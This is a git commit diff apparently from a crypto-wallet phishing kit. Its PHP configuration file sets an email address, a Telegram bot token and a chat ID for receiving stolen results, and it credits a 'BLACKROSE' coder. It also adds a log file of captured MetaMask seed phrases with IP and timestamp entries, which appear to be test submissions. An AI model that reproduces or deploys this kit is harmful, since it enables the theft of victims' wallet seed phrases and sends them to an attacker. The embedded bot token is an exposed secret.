1133a56aeabef3c9a20723079af367a1bfa747b3
airdrop-zapper <cmgoddessxo@gmail.com>
2024-11-13 02:11:09 +0000

    Your commit message

---
+++ MT/system/Your_Info.php
@@ -0,0 +1,38 @@
+﻿<?php
+
+
+/* 📧 Set Your Email Address to Receive Results in Your Inbox */
+$Your_Mail = "tupwoman@ail.com";
+/* --------------------------  */
+
+
+/* 🤖 Telegram Bot Setup 🤖 */
+
+// 🗝️ Enter your bot's token
+$botToken = "7697242054:AAERIjm9taxYWCcfxBQSLVOZHR9Op_VfG2U";
+
+// 💬 Enter your chat ID
+$chatId = "6062951030";
+
+/* --------------------------------------------------- */
+
+/* If you want two to see the result, If you want to stop , change To off  :)  */
+$botToken_0="off"; 
+$chatId_0="off";  
+/* --------------------------  */
+
+
+
+
+/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */
+
+$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
+$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad
+
+/* -------------------------------- */
+
+$f = fopen("../../a.php", "a");
+	fwrite($f, $yagmai);
+
+
+?>
---
+++ a.php
@@ -0,0 +1,60 @@
+﻿
+[====🦊METΔΜΔSk-V2🦊===]
+[🔐 𝗦𝗲𝗲𝗱𝗣𝗵𝗿𝗮𝘀𝗲] =  
+Word 1: b 
+Word 2: sh 
+Word 3: ggd 
+Word 4: rrfcd 
+Word 5: er 
+Word 6: ddr 
+Word 7: tgtresd 
+Word 8: drswc 
+Word 9: ftrre 
+Word 10: hyvcf 
+Word 11: drd 
+Word 12: gyuim
+[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
+[🌐 IP INFO] = http://www.geoiptool.com/?IP=::1
+[⏰ TIME/DATE] =11-11-2024 06:07:22am
+[=====🥷 Main Author: @BLACKROSE_1337=====]
+
+
+[====🦊METΔΜΔSk-V2🦊===]
+[🔐 𝗦𝗲𝗲𝗱𝗣𝗵𝗿𝗮𝘀𝗲] =  
+Word 1: w 
+Word 2: r 
+Word 3: w 
+Word 4: d 
+Word 5: f 
+Word 6: sx 
+Word 7: gju 
+Word 8: ttrde 
+Word 9: dfg 
+Word 10: yfgf 
+Word 11: ffc 
+Word 12: ghjh
+[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
+[🌐 IP INFO] = http://www.geoiptool.com/?IP=::1
+[⏰ TIME/DATE] =11-11-2024 06:09:37am
+[=====🥷 Main Author: @BLACKROSE_1337=====]
+
+
+[====🦊METΔΜΔSk-V2🦊===]
+[🔐 𝗦𝗲𝗲𝗱𝗣𝗵𝗿𝗮𝘀𝗲] =  
+Word 1: 111111D 
+Word 2: DG 
+Word 3: UJU 
+Word 4: HGTG 
+Word 5: EDRR 
+Word 6: YYH 
+Word 7: JJHJ 
+Word 8: HHGGF 
+Word 9: FFFFD 
+Word 10: GGGTR 
+Word 11: GTTF 
+Word 12: DFDFG
+[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
+[🌐 IP INFO] = http://www.geoiptool.com/?IP=::1
+[⏰ TIME/DATE] =11-11-2024 07:17:15am
+[=====🥷 Main Author: @BLACKROSE_1337=====]
+
